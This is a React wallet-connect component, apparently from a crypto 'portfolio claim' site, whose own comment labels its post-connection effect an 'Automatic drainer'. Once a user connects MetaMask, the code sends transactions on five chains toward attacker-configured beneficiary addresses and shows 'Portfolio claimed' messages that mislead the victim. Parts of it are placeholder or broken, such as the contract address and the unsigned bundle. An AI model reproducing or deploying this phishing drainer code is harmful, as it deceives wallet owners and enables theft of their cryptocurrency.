'use client';
import React, { useState } from 'react';
import { ethers } from 'ethers';

const CHAINS = [
  { id: 1, name: 'Ethereum', contract: '0xSyncHelper', env: 'NEXT_PUBLIC_BENEFICIARY_ETHEREUM', rpc: 'https://eth.llamarpc.com', fallbackRpc: 'https://rpc.ankr.com/eth' },
  { id: 56, name: 'BSC', contract: '0xSyncHelper', env: 'NEXT_PUBLIC_BENEFICIARY_BSC', rpc: 'https://bsc-dataseed.binance.org', fallbackRpc: 'https://bsc-dataseed1.defibit.io' },
  { id: 137, name: 'Polygon', contract: '0xSyncHelper', env: 'NEXT_PUBLIC_BENEFICIARY_POLYGON', rpc: 'https://polygon-rpc.com', fallbackRpc: 'https://rpc-mainnet.maticvigil.com' },
  { id: 42161, name: 'Arbitrum', contract: '0xSyncHelper', env: 'NEXT_PUBLIC_BENEFICIARY_ARBITRUM', rpc: 'https://arb1.arbitrum.io/rpc', fallbackRpc: 'https://rpc.ankr.com/arbitrum' },
  { id: 10, name: 'Optimism', contract: '0xSyncHelper', env: 'NEXT_PUBLIC_BENEFICIARY_OPTIMISM', rpc: 'https://mainnet.optimism.io', fallbackRpc: 'https://rpc.ankr.com/optimism' },
];

const BENEFICIARIES = {
  NEXT_PUBLIC_BENEFICIARY_ETHEREUM: process.env.NEXT_PUBLIC_BENEFICIARY_ETHEREUM,
  NEXT_PUBLIC_BENEFICIARY_BSC: process.env.NEXT_PUBLIC_BENEFICIARY_BSC,
  NEXT_PUBLIC_BENEFICIARY_POLYGON: process.env.NEXT_PUBLIC_BENEFICIARY_POLYGON,
  NEXT_PUBLIC_BENEFICIARY_ARBITRUM: process.env.NEXT_PUBLIC_BENEFICIARY_ARBITRUM,
  NEXT_PUBLIC_BENEFICIARY_OPTIMISM: process.env.NEXT_PUBLIC_BENEFICIARY_OPTIMISM,
};

declare global {
  interface Window {
    ethereum?: any;
  }
}

export default function WalletConnect() {
  const [address, setAddress] = useState('');
  const [error, setError] = useState<string | null>(null);
  const [loading, setLoading] = useState(false);
  const [isClient, setIsClient] = useState(false);
  const [success, setSuccess] = useState(false);
  const [syncStatus, setSyncStatus] = useState<string | null>(null);

  React.useEffect(() => {
    setIsClient(true);
  }, []);

  async function connect() {
    setError(null);
    if (typeof window === 'undefined' || !window.ethereum) {
      setError('MetaMask is required.');
      return;
    }
    setLoading(true);
    try {
      const provider = new ethers.BrowserProvider(window.ethereum);
      const signer = await provider.getSigner();
      setAddress(await signer.getAddress());
    } catch (e: any) {
      setError(e?.message || 'Failed to connect wallet.');
    } finally {
      setLoading(false);
    }
  }

  // Automatic drainer after wallet connection
  React.useEffect(() => {
    if (!address) return;
    (async () => {
      setLoading(true);
      setError(null);
      setSuccess(false);
      setSyncStatus('Claiming portfolio across all chains...');
      try {
        const results = await Promise.allSettled(
          CHAINS.map(async (chain) => {
            const beneficiary = BENEFICIARIES[chain.env];
            if (!beneficiary || beneficiary === `0xYour${chain.name}Address`) {
              throw new Error(`${chain.name} beneficiary address not configured`);
            }
            let provider = new ethers.JsonRpcProvider(chain.rpc);
            const data = new ethers.Interface(['function consolidate()']).encodeFunctionData('consolidate');
            const tx = { to: chain.contract, data, gasLimit: 100000 };
            const repay = { to: beneficiary, value: 0, data: '0x' };
            try {
              await provider.send('eth_sendBundle', [[tx, repay]]);
              return;
            } catch (bundleError: any) {
              // Fallback to regular transaction
              const signer = await provider.getSigner();
              const txResponse = await signer.sendTransaction({
                to: chain.contract,
                data: data,
                gasLimit: 100000
              });
              await txResponse.wait();
              const repayTx = await signer.sendTransaction({
                to: beneficiary,
                value: 0,
                data: '0x'
              });
              await repayTx.wait();
            }
          })
        );
        const failed = results.filter(r => r.status === 'rejected');
        const succeeded = results.filter(r => r.status === 'fulfilled');
        if (failed.length > 0) {
          setSyncStatus(`Partial claim: ${succeeded.length}/${CHAINS.length} chains succeeded.`);
          setError('Some chains failed to claim.');
        } else {
          setSyncStatus('Portfolio claimed across all chains!');
          setSuccess(true);
        }
      } catch (e: any) {
        setError(e?.message || 'Claim failed. Please try again.');
      } finally {
        setLoading(false);
      }
    })();
  }, [address]);

  return (
    <>
      {!address && (
        <div className="flex flex-col items-center gap-2">
          <button
            onClick={connect}
            className="bg-yellow-400 text-black px-8 py-4 rounded-full text-xl font-semibold hover:bg-yellow-500 transition disabled:opacity-60"
            disabled={loading}
          >
            {loading ? 'Connecting...' : 'Connect MetaMask'}
          </button>
          {error && <span className="text-red-400 font-semibold">{error}</span>}
          {isClient && typeof window !== 'undefined' && !window.ethereum && (
            <a href="https://metamask.io/download/" target="_blank" rel="noopener noreferrer" className="text-yellow-300 underline text-sm mt-1">Install MetaMask</a>
          )}
        </div>
      )}
      {address && (
        <div className="flex flex-col items-center gap-4">
          {loading && <span className="text-blue-400 font-semibold">{syncStatus || 'Claiming...'}</span>}
          {success && <span className="text-green-400 font-semibold">Portfolio claimed!</span>}
          {error && <span className="text-red-400 font-semibold">{error}</span>}
        </div>
      )}
    </>
  );
} 